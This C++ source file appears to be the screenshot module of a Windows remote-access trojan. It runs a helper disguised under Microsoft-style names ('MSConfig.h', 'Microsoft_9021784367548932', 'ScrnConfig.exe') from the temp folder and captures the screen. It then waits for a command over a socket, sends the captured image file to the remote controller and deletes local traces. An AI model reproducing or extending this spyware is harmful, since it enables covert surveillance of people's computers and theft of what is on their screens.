#include "MSConfig.h"

void screenshot(SOCKET& ConnectSocket)
{
     char command[1024], response[1024], temppath[1024];
     int res, created;
     string totr;
     HANDLE hw;
     WIN32_FIND_DATA fd;
     STARTUPINFO si;
     PROCESS_INFORMATION pi;
     
     GetTempPath(1024, temppath);
     strcat(temppath, "Microsoft_9021784367548932\\Temp\\ScrnConfig.exe");
     
     ZeroMemory( &si, sizeof(si) );
     si.cb = sizeof(si);
     ZeroMemory( &pi, sizeof(pi) );
     created = CreateProcess(temppath, "AppName ScreenShot", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

     if (created != 0)
     {
                 WaitForSingleObject(pi.hProcess, INFINITE);
                 CloseHandle(pi.hProcess);
                 CloseHandle(pi.hThread);
                 strcpy(command, "OK+");
                 send(ConnectSocket, command, (int)strlen(command), 0);
     }
     else
     {
         strcpy(command, "NO+");
         send(ConnectSocket, command, (int)strlen(command), 0);
         return;
     }
     
     
     totr.clear();
     do
     {
                 res = recv(ConnectSocket, response, 1024, 0);
                 response[res] = '\0';
                 totr += response;
     } while (totr[totr.length() - 1] != '+');
     
     string target;
     GetTempPath(1024, temppath);
     strcat(temppath, "Microsoft_9021784367548932\\SC\\temp.db");
     ifstream feed(temppath);
     feed >> target;
     feed.close();
     DeleteFile(temppath);
     GetTempPath(1024, temppath);
     strcat(temppath, "Microsoft_9021784367548932\\SC\\");
     strcat(temppath, target.c_str());
     hw = FindFirstFile(temppath, &fd);
     if (hw == INVALID_HANDLE_VALUE) return;
     transfer(ConnectSocket, fd.cFileName, NULL, fd.nFileSizeLow, "SC");
     DeleteFile(temppath);
     
     return;
}
